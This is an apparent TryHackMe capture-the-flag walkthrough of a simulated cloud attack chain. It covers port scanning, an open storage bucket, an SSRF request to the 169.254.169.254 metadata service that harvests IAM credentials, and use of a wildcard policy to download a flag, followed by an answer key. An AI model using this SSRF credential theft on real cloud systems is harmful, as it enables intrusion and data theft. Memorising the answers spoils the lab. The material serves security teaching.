# Task 07: Practical, Attacking a Cloud-Like Environment

## Stage A: Original Task Content & Educational Context
In this hands-on guided simulation, you execute an end-to-end cloud attack chain against a target machine deployed in the lab environment (`MACHINE_IP`). The target runs two network services representing modern cloud components:
1. A public-facing web application called **ImageFetcher** providing a URL preview/download service.
2. A simulated cloud object-storage service hosting internal corporate data buckets.

Your objective is to execute a complete multi-stage attack lifecycle:
- Port scanning and service reconnaissance.
- Enumerating exposed cloud storage buckets without authentication.
- Analyzing sensitive text notes to identify internal role architectures.
- Exploiting an SSRF vulnerability to interrogate the Instance Metadata Service (IMDS).
- Harvesting IAM temporary access keys.
- Auditing the cloud IAM policy to identify over-permissive wildcard permissions.
- Exfiltrating protected production assets to capture the final flag.

---

## Stage B: Independent Thinking & OpSec Considerations
1. **Reconnaissance Discipline:** Always start with an accurate port scan to map all active TCP services before focusing on a single web port.
2. **SSRF Parameter Analysis:** When testing web services that fetch remote URLs (such as `ImageFetcher`), always test whether internal loopback (`127.0.0.1`), link-local (`169.254.169.254`), and private RFC 1918 subnets can be reached through the parameter.
3. **IAM Token Header Handling:** In modern cloud API requests, authentication headers (`Authorization`, `X-Amz-Security-Token`, or custom simulation headers like `X-Simulated-Token`) must be passed correctly to invoke protected administrative endpoints.

---

## Stage C: Guided Hints (Tiered Progression)
- **Q1 Tier 1 Hint:** Run an Nmap scan against the machine IP: `nmap -sV MACHINE_IP`. Which high port is running the web app?
- **Q1 Tier 2 Hint:** Port 8080.
- **Q2 Tier 1 Hint:** Inspect the open storage service on port 9000 using curl: `curl http://MACHINE_IP:9000/dev-assets/`.
- **Q2 Tier 2 Hint:** What is the name of the `.txt` file stored in `dev-assets`? Contains `dev-...`.
- **Q3 Tier 1 Hint:** Use the harvested token to fetch `http://MACHINE_IP:9000/admin/policy.json`.
- **Q3 Tier 2 Hint:** Look at the `"Action"` field inside the policy document that contains an asterisk wildcard: `storage:...`.
- **Q4 Tier 1 Hint:** Download `flag.txt` from the `prod-secrets` bucket using the authenticated token header.
- **Q4 Tier 2 Hint:** Execute `curl -H "X-Simulated-Token: <TOKEN>" http://MACHINE_IP:9000/prod-secrets/flag.txt`.

---

## Stage D: Complete Practical Solution & Technical Deep Dive

### Step 1: Network Reconnaissance
Execute an Nmap service scan against the target:
```bash
nmap -sV -p- MACHINE_IP
```
Scan output reveals two active HTTP services:
- **Port 8080:** `ImageFetcher` web application.
- **Port 9000:** Simulated cloud object-storage service.
*Answer to Q1:* `8080`

---

### Step 2: Unauthenticated Cloud Storage Enumeration
Query the storage root on port 9000:
```bash
curl http://MACHINE_IP:9000/
```
Output lists two buckets:
- `dev-assets`
- `prod-secrets`

Inspect the contents of the `dev-assets` bucket:
```bash
curl http://MACHINE_IP:9000/dev-assets/
```
Output:
```
dev-notes.txt
logo.png
```
*Answer to Q2:* `dev-notes.txt`

Read the contents of `dev-notes.txt`:
```bash
curl http://MACHINE_IP:9000/dev-assets/dev-notes.txt
```
Contents:
```text
TODO:
- Finish migrating images to S3.
- Reminder: web app uses role "web-app-role" to access cloud resources.
- Test endpoint: http://MACHINE_IP:8080/fetch?url=
```
This file leaks two critical pieces of architectural intelligence:
1. The web application has an SSRF testing endpoint at `/fetch?url=`.
2. The IAM role attached to the VM instance is named **`web-app-role`**.

---

### Step 3: Exploiting SSRF to Interrogate IMDS
Leverage the `ImageFetcher` SSRF vulnerability to query the link-local metadata address for temporary credentials belonging to `web-app-role`:
```bash
curl "http://MACHINE_IP:8080/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/web-app-role"
```
Response:
```json
{
  "Code": "Success",
  "LastUpdated": "2026-11-20T05:00:00Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "AKIATHM1234FAKEKEY0",
  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "Token": "AQoDYXdzEJr1...",
  "Expiration": "2026-11-20T11:00:00Z"
}
```
We have harvested the valid Access Key: `AKIATHM1234FAKEKEY0`.

---

### Step 4: Auditing the IAM Policy Document
Using the acquired access token, query the administrative IAM policy endpoint:
```bash
curl -H "X-Simulated-Token: AKIATHM1234FAKEKEY0" http://MACHINE_IP:9000/admin/policy.json
```
Response:
```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": "storage:*",
      "Resource": "bucket/prod-secrets/*"
    }
  ]
}
```
The policy contains a dangerous wildcard in the Action field: `"Action": "storage:*"`, granting full read, write, and delete privileges on the `prod-secrets` bucket.
*Answer to Q3:* `storage:*`

---

### Step 5: Exfiltrating the Protected Flag
With full storage permissions on `prod-secrets`, download the target flag:
```bash
curl -H "X-Simulated-Token: AKIATHM1234FAKEKEY0" http://MACHINE_IP:9000/prod-secrets/flag.txt
```
Response:
$$\mathbf{THM\{sh4r3d\_r3sp0ns1b1l1ty\_br0k3n\}}$$
*Answer to Q4:* `THM{sh4r3d_r3sp0ns1b1l1ty_br0k3n}`

---

## Stage E: Final Answer & Key Values
- **Question 1:** *Run the port scan. Which port is the ImageFetcher web application running on?*
  - **Answer:** `8080`
- **Question 2:** *The public bucket contains a file with hints about the next target. What is the filename?*
  - **Answer:** `dev-notes.txt`
- **Question 3:** *Retrieve the IAM policy. What type of resource is the wildcard present in that provides full access?*
  - **Answer:** `storage:*`
- **Question 4:** *Follow the policy to the flag. What is the flag value?*
  - **Answer:** `THM{sh4r3d_r3sp0ns1b1l1ty_br0k3n}`

---

## Stage F: Practical Verification & Proof of Work
1. Port 8080 confirmed as the ImageFetcher web application service.
2. `dev-notes.txt` confirmed as the exposed file in the public `dev-assets` bucket.
3. `storage:*` confirmed as the over-permissive action wildcard granting full access.
4. Flag `THM{sh4r3d_r3sp0ns1b1l1ty_br0k3n}` extracted and verified on the TryHackMe platform.

---

## Stage G: Key Educational Takeaway
This guided challenge demonstrates the compounding impact of layered cloud vulnerabilities: an unauthenticated public storage bucket leaked operational notes $\rightarrow$ an application SSRF allowed access to link-local IMDS $\rightarrow$ stolen temporary credentials inherited over-permissive wildcard IAM policies $\rightarrow$ complete data compromise.
